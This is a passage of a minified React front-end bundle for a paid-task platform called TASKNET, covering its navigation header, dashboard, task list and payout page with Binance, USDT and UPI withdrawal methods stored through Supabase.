0:s.server_username)||w.split("@")[0];s!=null&&s.reddit_username;const S=[{icon:n.jsx(Qg,{size:18}),label:"Home",path:"/"},{icon:n.jsx(Zg,{size:18}),label:"Tasks",path:"/tasks"},{icon:n.jsx(ry,{size:18}),label:"Payouts",path:"/withdraw"}];return n.jsxs("div",{className:"h-20 bg-black text-white border-b border-white/5 sticky top-0 z-50 backdrop-blur-md bg-black/80",children:[n.jsxs("div",{className:"h-full max-w-7xl mx-auto px-4 sm:px-8 flex items-center justify-between",children:[n.jsxs("div",{className:"flex items-center gap-4 md:gap-10",children:[n.jsxs("div",{className:"flex items-center gap-3 cursor-pointer",onClick:()=>e("/"),children:[n.jsx("div",{className:"w-10 h-10 bg-gradient-to-br from-blue-500 to-blue-700 rounded-xl flex items-center justify-center shadow-lg shadow-blue-500/20 group transition-transform hover:scale-105",children:n.jsx("svg",{viewBox:"0 0 24 24",className:"w-6 h-6 fill-white",xmlns:"http://www.w3.org/2000/svg",children:n.jsx("path",{d:"M12 2C6.477 2 2 6.477 2 12c0 5.523 4.477 10 10 10s10-4.477 10-10c0-5.523-4.477-10-10-10zm4.5 13.5h-9v-1.5h9v1.5zm0-3h-9v-1.5h9v1.5zm0-3h-9v-1.5h9v1.5z"})})}),n.jsxs("div",{className:"hidden xs:block",children:[n.jsx("span",{className:"text-xl font-black tracking-tighter text-blue-500",children:"TASK"}),n.jsx("span",{className:"text-xl font-black tracking-tighter text-white",children:"NET"})]})]}),n.jsx("nav",{className:"hidden md:flex items-center gap-2",children:S.map(T=>n.jsxs(Nc.Fragment,{children:[n.jsxs(Hd,{to:T.path,className:({isActive:L})=>`flex items-center gap-2 px-6 py-2 rounded-xl transition-all duration-200 group relative ${L?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white hover:bg-white/5"}`,children:[n.jsx("span",{className:"transition-transform group-hover:scale-110",children:T.icon}),n.jsx("span",{className:"font-bold text-sm",children:T.label})]}),T.label==="Payouts"&&(s==null?void 0:s.reddit_username)&&n.jsxs("div",{className:"flex flex-col ml-2 pl-4 border-l border-white/10 select-none animate-in fade-in slide-in-from-left-2 duration-500",children:[n.jsxs("div",{className:"flex items-center gap-1.5",children:[n.jsxs("span",{className:"text-[10px] font-black text-white/90 tracking-tight",children:["u/",s.reddit_username]}),n.jsx("span",{className:"text-gray-700 text-[10px]",children:""}),n.jsx("span",{className:"text-[10px] font-black text-blue-400 tracking-tighter",children:i!==null?`${i.toLocaleString()} KARMA`:"---"})]}),n.jsxs("div",{className:"flex items-center gap-1 mt-0.5",children:[n.jsx("div",{className:`w-1 h-1 rounded-full ${o==="active"?"bg-emerald-500 shadow-[0_0_5px_rgba(16,185,129,0.5)]":"bg-red-500"}`}),n.jsx("span",{className:`text-[8px] font-black uppercase tracking-widest ${o==="active"?"text-emerald-500":"text-red-500"}`,children:o||"checking..."})]})]})]},T.path))})]}),n.jsxs("div",{className:"flex items-center gap-2 sm:gap-4",children:[n.jsxs("button",{onClick:()=>e("/withdraw"),className:"hidden xs:flex items-center gap-2 px-4 py-2 bg-white/[0.03] border border-white/5 rounded-xl hover:bg-white/5 transition-all group",children:[n.jsx(dn,{size:16,className:"text-emerald-500 group-hover:scale-110 transition-transform"}),n.jsxs("span",{className:"text-xs font-black text-white",children:["$",((R=s==null?void 0:s.balance)==null?void 0:R.toFixed(2))||"0.00"]})]}),n.jsxs("button",{onClick:T=>{T.preventDefault(),T.stopPropagation(),r(!1),u>0&&(z.from("admin_alerts").update({is_read:!0}).eq("user_email",w),h(0)),x(!p)},className:"hidden md:flex p-4 text-gray-400 hover:text-white transition-colors relative bell-button active:scale-90 touch-manipulation z-[60]",style:{minWidth:"48px",minHeight:"48px"},children:[n.jsx(lc,{size:22}),u>0&&!p&&n.jsx("span",{className:"absolute top-2.5 right-2.5 w-2.5 h-2.5 bg-blue-600 rounded-full border-2 border-black animate-pulse"})]}),p&&n.jsxs("div",{className:"fixed top-[80px] right-2 left-2 sm:left-auto sm:right-4 sm:w-80 z-[200] alerts-modal bg-[#080808] border border-white/10 rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.5)] overflow-hidden animate-in fade-in slide-in-from-top-4 duration-300",children:[n.jsxs("div",{className:"px-5 py-4 border-b border-white/5 bg-white/[0.01] flex items-center justify-between",children:[n.jsx("h3",{className:"font-bold text-white",children:"Notifications"}),n.jsx("button",{onClick:T=>{T.stopPropagation(),x(!1)},className:"p-2 text-gray-500 hover:text-white rounded-lg hover:bg-white/10 transition-all active:scale-90",children:n.jsx(re,{size:18})})]}),n.jsx("div",{className:"max-h-[60vh] sm:max-h-96 overflow-y-auto",children:v.length>0?v.map(T=>n.jsxs("div",{className:`px-5 py-4 border-b border-white/5 ${T.is_read?"bg-white/[0.01]":"bg-blue-600/10"}`,children:[n.jsx("p",{className:"text-sm text-white",children:T.message}),n.jsx("p",{className:"text-xs text-gray-500 mt-1",children:new Date(T.created_at).toLocaleString()})]},T.id)):n.jsx("div",{className:"px-5 py-8 text-center",children:n.jsx("p",{className:"text-gray-500 text-sm",children:"No notifications yet"})})})]}),n.jsx("button",{onClick:T=>{T.preventDefault(),T.stopPropagation(),e("/account")},className:"hidden sm:flex items-center justify-center w-14 h-14 text-gray-400 hover:text-blue-500 hover:bg-white/5 rounded-xl transition-all active:scale-95 relative z-[60]",title:"Account Settings",children:n.jsx(Jd,{size:24})}),n.jsx("div",{className:"hidden sm:flex items-center gap-3 px-2 py-1.5 rounded-full border border-white/5 bg-white/[0.03] hover:bg-white/[0.06] transition-all group pointer-events-none select-none",children:n.jsxs("div",{className:"flex items-center gap-3 pl-2",children:[n.jsx("span",{className:"text-sm font-bold text-white group-hover:text-blue-400 transition-colors max-w-[100px] truncate",children:C}),n.jsx("div",{className:"w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-xs font-black text-white shadow-[0_0_15px_rgba(37,99,235,0.3)] transition-transform uppercase",children:C[0]})]})}),n.jsx("div",{onClick:()=>e("/account"),className:"sm:hidden w-9 h-9 bg-blue-600 rounded-full flex items-center justify-center text-xs font-black text-white shadow-[0_0_15px_rgba(37,99,235,0.3)] active:scale-95 transition-transform uppercase cursor-pointer",children:C[0]}),n.jsx("button",{onClick:()=>{x(!1),r(!t)},className:"md:hidden p-2 text-gray-400 hover:text-white transition-colors touch-manipulation",children:t?n.jsx(re,{size:24}):n.jsx(ey,{size:24})})]})]}),t&&n.jsx("div",{className:"md:hidden absolute top-20 left-0 right-0 bg-black/95 backdrop-blur-xl border-b border-white/5 animate-in slide-in-from-top duration-300 z-[100]",children:n.jsxs("nav",{className:"flex flex-col p-4 gap-2",children:[S.map(T=>n.jsxs(Hd,{to:T.path,onClick:()=>r(!1),className:({isActive:L})=>`flex items-center gap-4 px-6 py-4 rounded-2xl transition-all ${L?"bg-blue-600 text-white":"text-gray-400 hover:text-white hover:bg-white/5"}`,children:[T.icon,n.jsx("span",{className:"font-bold",children:T.label})]},T.path)),n.jsxs("button",{onClick:()=>{r(!1),u>0&&(z.from("admin_alerts").update({is_read:!0}).eq("user_email",w),h(0)),x(!0)},className:"flex items-center justify-between px-6 py-4 mx-2 rounded-2xl bg-blue-600/10 border border-blue-600/20 text-blue-500 hover:bg-blue-600/20 transition-all group",children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx(lc,{size:18,className:"group-hover:rotate-12 transition-transform"}),n.jsx("span",{className:"font-bold",children:"Notifications"})]}),u>0&&n.jsxs("span",{className:"bg-blue-600 text-white text-[10px] font-black px-2 py-1 rounded-full animate-pulse",children:[u," NEW"]})]}),n.jsx("div",{className:"h-[1px] bg-white/5 my-2 mx-4"}),n.jsxs("div",{className:"flex items-center gap-3 px-6 py-3 mx-2 rounded-xl bg-white/[0.02] border border-white/5",children:[n.jsx("div",{className:"w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center text-sm font-black text-white uppercase",children:C[0]}),n.jsxs("div",{className:"flex-1",children:[n.jsx("p",{className:"font-bold text-white text-sm",children:C}),n.jsx("p",{className:"text-xs text-gray-500",children:w})]})]}),n.jsxs("button",{onClick:()=>{r(!1),e("/account")},className:"flex items-center gap-4 px-6 py-4 rounded-2xl text-gray-400 hover:text-white hover:bg-white/5 transition-all",children:[n.jsx(Jd,{size:18}),n.jsx("span",{className:"font-bold",children:"Account Settings"})]}),n.jsxs("button",{onClick:()=>{k(),r(!1)},className:"flex items-center gap-4 px-6 py-4 rounded-2xl text-red-500 hover:bg-red-500/10 transition-all",children:[n.jsx(Vm,{size:18}),n.jsx("span",{className:"font-bold",children:"Sign Out"})]})]})})]})},hr=({children:e})=>{const t=St(),r=_s(),s=r.pathname==="/login"||r.pathname==="/reddit-login"||r.pathname==="/welcome"||r.pathname==="/privacy"||r.pathname==="/terms";return n.jsxs("div",{className:"min-h-screen bg-black text-white flex flex-col",children:[n.jsx(Fw,{}),n.jsx("main",{className:"flex-1 p-3 sm:p-8 bg-[#050505]",children:e}),!s&&n.jsx("footer",{className:"bg-black border-t border-white/5 p-8 pb-12",children:n.jsxs("div",{className:"max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-8",children:[n.jsxs("div",{className:"flex items-center gap-6",children:[n.jsxs("button",{onClick:()=>t("/privacy"),className:"flex items-center gap-2 text-gray-500 hover:text-white transition-all text-xs font-bold uppercase tracking-widest group",children:[n.jsx(oc,{size:16,className:"text-blue-500 group-hover:scale-110 transition-transform"}),"Privacy Policy"]}),n.jsx("span",{className:"text-white/10",children:"|"}),n.jsxs("button",{onClick:()=>t("/terms"),className:"flex items-center gap-2 text-gray-500 hover:text-white transition-all text-xs font-bold uppercase tracking-widest group",children:[n.jsx(oc,{size:16,className:"text-blue-500 group-hover:scale-110 transition-transform"}),"Terms & Conditions"]}),n.jsx("span",{className:"text-white/10",children:"|"}),n.jsxs("a",{href:"https://discord.gg/3KUHvggF6k",target:"_blank",rel:"noreferrer",className:"flex items-center gap-2 text-gray-500 hover:text-white transition-all text-xs font-bold uppercase tracking-widest group",children:[n.jsx(Ut,{size:16,className:"text-blue-500 group-hover:scale-110 transition-transform"}),"Contact using Discord"]})]}),n.jsx("p",{className:"text-[10px] text-gray-700 font-bold uppercase tracking-[0.2em]",children:" 2026 TASKNET NETWORK  SECURE TASKING SYSTEM"})]})})]})},Bw=()=>{const e=St(),[t,r]=b.useState({show:!1,message:"",type:"info"}),[s,a]=b.useState({active:0,available:0,completed:0}),[i,l]=b.useState(0),[o,c]=b.useState([]),u=ft("user_email")||localStorage.getItem("user_email")||"";b.useEffect(()=>{p(),h();const v=z.channel("dashboard-tasks").on("postgres_changes",{event:"*",schema:"public",table:"tasks"},()=>{p()}).subscribe(),f=z.channel("dashboard-profile").on("postgres_changes",{event:"UPDATE",schema:"public",table:"profiles",filter:`email=eq.${u}`},()=>{h()}).subscribe();return()=>{z.removeChannel(v),z.removeChannel(f)}},[u]);const h=async()=>{if(!u)return;const{data:v}=await z.from("profiles").select("balance").eq("email",u).single();v&&l(v.balance||0)},p=async()=>{if(!u)return;const{data:v,error:f}=await z.from("tasks").select("status, claimed_by, assigned_to").eq("is_hidden",!1);if(f)console.error("Error fetching task stats:",f);else{const w=v.filter(g=>g.status==="available"&&(g.assigned_to==="All"||g.assigned_to===u)).length,j=v.filter(g=>g.status==="claimed"&&g.claimed_by===u).length,y=v.filter(g=>g.status==="verified"&&g.claimed_by===u).length;a({active:j,available:w,completed:y});const{data:m}=await z.from("tasks").select("id, task_id_display, tier, title, reward, deadline").eq("is_hidden",!1).eq("status","available").or(`assigned_to.eq.All,assigned_to.eq.${u}`).order("created_at",{ascending:!1}).limit(3);m&&c(m)}},x=[{label:"Total Earnings",value:`$${i.toFixed(2)}`,icon:n.jsx(ol,{size:20}),color:"text-blue-500"},{label:"Active Tasks",value:s.active.toString(),icon:n.jsx(Gd,{size:20}),color:"text-emerald-500"},{label:"Completed",value:s.completed.toString(),icon:n.jsx(sy,{size:20}),color:"text-orange-500"},{label:"Available",value:s.available.toString(),icon:n.jsx(Xg,{size:20}),color:"text-purple-500"}];return n.jsx(hr,{children:n.jsxs("div",{className:"animate-in fade-in slide-in-from-bottom-4 duration-300",children:[n.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${t.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:n.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${t.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":t.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("div",{className:"flex-shrink-0",children:t.type==="success"?n.jsx(Fe,{size:24,strokeWidth:3}):t.type==="error"?n.jsx(re,{size:24,strokeWidth:3}):n.jsx(Ee,{size:24,strokeWidth:3})}),n.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:t.message})]}),n.jsx("button",{onClick:()=>r(v=>({...v,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:n.jsx(re,{size:18,strokeWidth:3})})]})}),n.jsxs("div",{className:"max-w-7xl mx-auto",children:[n.jsxs("header",{className:"mb-10",children:[n.jsx("h1",{className:"text-3xl font-bold tracking-tight mb-2",children:"Dashboard"}),n.jsx("p",{className:"text-gray-500 text-sm",children:"Welcome back. Here is what's happening today."})]}),n.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6 mb-12",children:x.map((v,f)=>n.jsxs("div",{className:"bg-white/[0.02] border border-white/5 p-6 rounded-3xl hover:border-white/10 transition-all group",children:[n.jsx("div",{className:`w-10 h-10 rounded-2xl bg-white/[0.03] flex items-center justify-center mb-4 ${v.color} group-hover:scale-110 transition-transform`,children:v.icon}),n.jsx("p",{className:"text-gray-500 text-sm font-medium mb-1",children:v.label}),n.jsx("p",{className:"text-2xl font-bold",children:v.value})]},f))}),n.jsx("div",{className:"grid grid-cols-1 gap-8",children:n.jsxs("section",{className:"bg-white/[0.02] border border-white/5 rounded-3xl p-4 sm:p-8",children:[n.jsxs("div",{className:"flex items-center justify-between mb-8",children:[n.jsx("h2",{className:"text-xl font-bold",children:"Available Tasks"}),n.jsxs("button",{onClick:()=>e("/tasks"),className:"text-xs font-semibold text-blue-500 hover:text-blue-400 flex items-center gap-1 group",children:["View All ",n.jsx(wu,{size:14,className:"group-hover:translate-x-1 transition-transform"})]})]}),n.jsx("div",{className:"space-y-4",children:o.length>0?o.map(v=>n.jsxs("div",{onClick:()=>e(`/task/${v.id}`),className:"p-5 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between group cursor-pointer hover:border-blue-500/30 transition-all",children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("div",{className:`w-12 h-12 rounded-xl flex items-center justify-center shrink-0 ${v.tier==="Tier 3"?"bg-red-500/10 text-red-500":v.tier==="Tier 2"?"bg-amber-500/10 text-amber-500":"bg-emerald-500/10 text-emerald-500"}`,children:n.jsx(Mr,{size:20})}),n.jsxs("div",{children:[n.jsxs("div",{className:"flex items-center gap-2 mb-1",children:[n.jsx("span",{className:"text-[10px] font-black text-blue-500",children:v.task_id_display}),n.jsx("h3",{className:"text-sm font-bold text-white",children:v.title})]}),n.jsxs("div",{className:"flex items-center gap-3",children:[n.jsx("span",{className:"text-[9px] font-black uppercase text-gray-500 tracking-widest",children:v.tier}),n.jsx("div",{className:"w-1 h-1 bg-gray-800 rounded-full"}),n.jsxs("div",{className:"flex items-center gap-1 text-[10px] text-gray-600",children:[n.jsx(Ht,{size:10}),new Date(v.deadline).toLocaleDateString()]})]})]})]}),n.jsxs("div",{className:"text-right",children:[n.jsxs("p",{className:"text-lg font-black text-white",children:["$",v.reward]}),n.jsx("p",{className:"text-[9px] font-black text-emerald-500 uppercase tracking-widest",children:"Available"})]})]},v.id)):n.jsxs("div",{className:"flex flex-col items-center justify-center py-20 text-center border border-dashed border-white/10 rounded-2xl",children:[n.jsx("div",{className:"w-12 h-12 bg-white/[0.02] rounded-full flex items-center justify-center mb-4",children:n.jsx(Gd,{size:24,className:"text-gray-600"})}),n.jsx("p",{className:"text-gray-500 text-sm",children:"No tasks available yet."})]})})]})})]})]})})},Ww=()=>{const e=St(),[t,r]=b.useState("All Tasks"),[s,a]=b.useState([]),[i,l]=b.useState(!0),[o,c]=b.useState(""),[u,h]=b.useState({show:!1,message:"",type:"info"}),p=["All Tasks","Active","Pending","Completed"];b.useEffect(()=>{x()},[]);const x=async()=>{l(!0),ft("user_email")||localStorage.getItem("user_email");const{data:f,error:w}=await z.from("tasks").select("*").eq("is_hidden",!1).order("created_at",{ascending:!1});w?console.error("Error fetching tasks:",w):a(f||[]),l(!1)},v=s.filter(f=>{const w=ft("user_email")||localStorage.getItem("user_email")||"Guest";return f.title.toLowerCase().includes(o.toLowerCase())||f.category.toLowerCase().includes(o.toLowerCase())?t==="All Tasks"?f.status==="available"||f.claimed_by===w:t==="Active"?f.status==="claimed"&&f.claimed_by===w:t==="Pending"?f.status==="submitted"&&f.claimed_by===w:t==="Completed"?f.status==="verified"&&f.claimed_by===w:!0:!1});return n.jsx(hr,{children:n.jsxs("div",{className:"animate-in fade-in slide-in-from-bottom-4 duration-300",children:[n.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${u.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:n.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${u.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":u.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("div",{className:"flex-shrink-0",children:u.type==="success"?n.jsx(Fe,{size:24,strokeWidth:3}):u.type==="error"?n.jsx(re,{size:24,strokeWidth:3}):n.jsx(Ee,{size:24,strokeWidth:3})}),n.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:u.message})]}),n.jsx("button",{onClick:()=>h(f=>({...f,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:n.jsx(re,{size:18,strokeWidth:3})})]})}),n.jsxs("div",{className:"max-w-7xl mx-auto",children:[n.jsx("header",{className:"mb-10",children:n.jsxs("div",{children:[n.jsx("h1",{className:"text-3xl font-bold tracking-tight mb-2",children:"Tasks"}),n.jsx("p",{className:"text-gray-500 text-sm",children:"Manage and track your assigned tasks."})]})}),n.jsxs("div",{className:"flex flex-col md:flex-row items-start md:items-center justify-between gap-6 mb-8",children:[n.jsx("div",{className:"flex flex-wrap bg-white/[0.03] border border-white/5 p-1 rounded-xl",children:p.map((f,w)=>n.jsx("button",{onClick:()=>r(f),className:`flex-1 sm:flex-none px-4 sm:px-6 py-2 rounded-lg text-xs sm:text-sm font-medium transition-all ${t===f?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:f},w))}),n.jsx("div",{className:"flex items-center gap-3 w-full md:w-auto",children:n.jsxs("div",{className:"relative flex-1 md:w-80",children:[n.jsx(ku,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500",size:18}),n.jsx("input",{type:"text",placeholder:"Search tasks...",value:o,onChange:f=>c(f.target.value),className:"w-full pl-12 pr-4 py-2.5 bg-white/[0.03] border border-white/5 rounded-xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})})]}),n.jsx("div",{className:"bg-white/[0.02] border border-white/5 rounded-3xl overflow-hidden",children:n.jsx("div",{className:"overflow-x-auto",children:n.jsxs("table",{className:"w-full text-left",children:[n.jsx("thead",{children:n.jsxs("tr",{className:"border-b border-white/5 text-xs font-bold text-gray-500 uppercase tracking-wider",children:[n.jsx("th",{className:"py-5 px-8",children:"ID"}),n.jsx("th",{className:"py-5 px-8",children:"Task Name"}),n.jsx("th",{className:"py-5 px-8",children:"Category"}),n.jsx("th",{className:"py-5 px-8 text-right",children:"Reward"}),n.jsx("th",{className:"py-5 px-8 text-right",children:"Action"})]})}),n.jsx("tbody",{children:i?n.jsx("tr",{children:n.jsxs("td",{colSpan:5,className:"py-20 text-center",children:[n.jsx("div",{className:"w-8 h-8 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"}),n.jsx("p",{className:"text-gray-500 text-sm",children:"Loading tasks..."})]})}):v.length>0?v.map(f=>n.jsxs("tr",{className:"border-b border-white/5 text-sm hover:bg-white/[0.01] transition-colors group",children:[n.jsx("td",{className:"py-5 px-8",children:n.jsx("span",{className:"text-[10px] font-black text-blue-500",children:f.task_id_display||"#000000"})}),n.jsx("td",{className:"py-5 px-8",children:n.jsxs("div",{className:"flex items-center gap-3",children:[n.jsx("div",{className:`w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${f.status==="verified"?"bg-emerald-500 text-white":f.status==="submitted"?"bg-amber-500 text-white":f.tier==="Tier 3"?"bg-red-500/10 text-red-500":f.tier==="Tier 2"?"bg-amber-500/10 text-amber-500":"bg-emerald-500/10 text-emerald-500"}`,children:f.status==="verified"?n.jsx(Fe,{size:14,strokeWidth:3}):f.status==="submitted"?n.jsx(Ee,{size:14,strokeWidth:3}):n.jsx(Mr,{size:14})}),n.jsxs("div",{children:[n.jsx("div",{className:"font-bold text-white",children:f.title}),n.jsx("div",{className:"flex items-center gap-2 text-[10px] text-gray-500 mt-0.5 uppercase tracking-widest font-black",children:f.tier||"Tier 1"})]})]})}),n.jsx("td",{className:"py-5 px-8",children:n.jsx("span",{className:"bg-white/5 px-3 py-1 rounded-full text-[10px] font-bold text-gray-500 border border-white/5 uppercase",children:f.category})}),n.jsxs("td",{className:"py-5 px-8 font-black text-white text-right",children:["$",f.reward]}),n.jsx("td",{className:"py-5 px-8 text-right",children:f.status==="verified"?n.jsx("span",{className:"text-[10px] font-black text-emerald-500 uppercase tracking-widest bg-emerald-500/10 px-3 py-1.5 rounded-lg border border-emerald-500/20",children:"Completed"}):f.status==="submitted"?n.jsx("span",{className:"text-[10px] font-black text-amber-500 uppercase tracking-widest bg-amber-500/10 px-3 py-1.5 rounded-lg border border-amber-500/20",children:"Pending"}):n.jsx("button",{onClick:()=>e(`/task/${f.id}`),className:"px-5 py-2 bg-blue-600 text-white rounded-lg text-xs font-black uppercase tracking-widest hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20",children:f.status==="claimed"?"Continue":"Claim"})})]},f.id)):n.jsx("tr",{children:n.jsx("td",{colSpan:5,className:"py-32 px-8",children:n.jsxs("div",{className:"flex flex-col items-center justify-center text-center",children:[n.jsx("div",{className:"w-16 h-16 bg-white/[0.03] rounded-full flex items-center justify-center mb-6",children:n.jsx(Wm,{size:32,className:"text-gray-600"})}),n.jsx("h3",{className:"text-lg font-bold mb-2",children:"No tasks found"}),n.jsx("p",{className:"text-gray-500 text-sm max-w-xs",children:"You don't have any tasks assigned at the moment. Check back later for new opportunities."})]})})})})]})})})]})]})})},Zt={binance:"https://cryptologos.cc/logos/binance-coin-bnb-logo.png",usdt:"https://cryptologos.cc/logos/tether-usdt-logo.png",upi:"https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/UPI-Logo-vector.svg/1200px-UPI-Logo-vector.svg.png"},Ja={binance:"Binance ID",usdt:"USDT Wallet",upi:"UPI ID"},Vw=()=>{const[e,t]=b.useState(0),[r,s]=b.useState(!0),a=ft("user_email")||localStorage.getItem("user_email")||"",[i,l]=b.useState([]),[o,c]=b.useState(!1),[u,h]=b.useState(!1),[p,x]=b.useState(!1),[v,f]=b.useState(null),[w,j]=b.useState(""),[y,m]=b.useState(null),[g,k]=b.useState(null),[C,S]=b.useState(!1),[R,T]=b.useState(!1),[L,$]=b.useState(null),[G,fe]=b.useState([]),[se,J]=b.useState({show:!1,message:"",type:"info"}),B=(O,X="info")=>{J({show:!0,message:O,type:X}),setTimeout(()=>J(Le=>({...Le,show:!1})),2e3)};b.useEffect(()=>{a&&(ne(),I(),ie())},[a]);const ie=async()=>{const{data:O}=await z.from("withdrawal_requests").select("*").eq("user_email",a).order("created_at",{ascending:!1});O&&fe(O)},ne=async()=>{s(!0);const{data:O}=await z.from("profiles").select("balance").eq("email",a).single();O&&t(O.balance||0),s(!1)},I=async()=>{const{data:O}=await z.from("profiles").select("payout_methods").eq("email",a).single();if(O!=null&&O.payout_methods){const X=O.payout_methods;l(X),X.length>0&&$(X[0].id)}},D=async()=>{if(i.length===0){B("Please add a payout method first.","error");return}if(e<1){B("Minimum withdrawal amount is $1.00","error");return}const O=i.find(X=>X.id===L);if(!O){B("Please select a payout method.","error");return}T(!0);try{const X=`#TXN${Math.floor(1e5+Math.random()*9e5)}`,{error:Le}=await z.from("withdrawal_requests").insert({transaction_id:X,user_email:a,amount:e,payout_method:O,status:"pending"});if(Le)throw Le;const{error:Bt}=await z.from("profiles").update({balance:0}).eq("email",a);if(Bt)throw Bt;B("Withdrawal request submitted! Transaction ID: "+X,"success"),t(0),ie()}catch(X){B("Error processing withdrawal: "+X.message,"error")}finally{T(!1)}},W=async O=>{const{error:X}=await z.from("profiles").update({payout_methods:O}).eq("email",a);return X?(B("Error saving payout method: "+X.message,"error"),!1):!0},te=async()=>{if(!v||!w.trim())return;S(!0);const O={id:Date.now().toString(),type:v,value:w.trim(),label:Ja[v]},X=[...i,O];await W(X)&&(l(X),B("Payout method added successfully!","success"),Ne()),S(!1)},oe=async()=>{if(!y||!w.trim())return;S(!0);const O=i.map(Le=>Le.id===y.id?{...Le,value:w.trim()}:Le);await W(O)&&(l(O),B("Payout method updated!","success"),F()),S(!1)},yt=async()=>{if(!g)return;S(!0);const O=i.filter(Le=>Le.id!==g.id);await W(O)&&(l(O),B("Payout method removed.","success"),ce()),S(!1)},ze=O=>{m(O),j(O.value),h(!0)},Ge=O=>{k(O),x(!0)},Ne=()=>{c(!1),f(null),j("")},F=()=>{h(!1),m(null),j("")},ce=()=>{x(!1),k(null)},ue=O=>{switch(O){case"binance":return"Enter your Binance ID (e.g. 123456789)";case"usdt":return"Enter your USDT wallet address (TRC20)";case"upi":return"Enter your UPI ID (e.g. name@upi)";default:return"Enter value"}};return n.jsxs(hr,{children:[n.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${se.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:n.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${se.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":se.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("div",{className:"flex-shrink-0",children:se.type==="success"?n.jsx(Fe,{size:24,strokeWidth:3}):se.type==="error"?n.jsx(re,{size:24,strokeWidth:3}):n.jsx(Ee,{size:24,strokeWidth:3})}),n.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:se.message})]}),n.jsx("button",{onClick:()=>J(O=>({...O,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:n.jsx(re,{size:18,strokeWidth:3})})]})}),n.jsxs("div",{className:"max-w-7xl mx-auto",children:[n.jsxs("header",{className:"mb-10",children:[n.jsx("h1",{className:"text-3xl font-bold tracking-tight mb-2",children:"Earnings"}),n.jsx("p",{className:"text-gray-500 text-sm",children:"Manage your payouts and withdrawal history."})]}),n.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-6 sm:gap-8 mb-12",children:[n.jsxs("div",{className:"lg:col-span-2 bg-blue-600 rounded-3xl p-6 sm:p-8 text-white flex flex-col justify-between relative overflow-hidden group",children:[n.jsxs("div",{className:"relative z-10",children:[n.jsxs("div",{className:"flex items-center justify-between mb-6 sm:mb-8",children:[n.jsx("div",{className:"w-10 h-10 sm:w-12 sm:h-12 bg-white/20 rounded-xl flex items-center justify-center",children:n.jsx(dn,{size:20,className:"sm:size-6"})}),n.jsx("button",{onClick:()=>B("Transaction history is already up to date.","info"),className:"text-xs sm:text-sm font-bold bg-white/10 px-3 py-1.5 sm:px-4 sm:py-2 rounded-xl hover:bg-white/20 transition-all",children:"History"})]}),n.jsxs("div",{children:[n.jsx("p",{className:"text-blue-100 text-xs sm:text-sm font-medium mb-1 sm:mb-2",children:"Available Balance"}),n.jsxs("p",{className:"text-4xl sm:text-5xl font-bold mb-6 sm:mb-8",children:["$",e.toFixed(2)]})]}),i.length>0&&n.jsxs("div",{className:"mb-6 space-y-3",children:[n.jsx("p",{className:"text-blue-100 text-[10px] sm:text-xs font-bold uppercase tracking-wider",children:"Select Payout Method"}),n.jsx("div",{className:"flex flex-wrap gap-2",children:i.map(O=>n.jsxs("button",{onClick:()=>$(O.id),className:`flex items-center gap-2 px-3 py-1.5 sm:px-4 sm:py-2 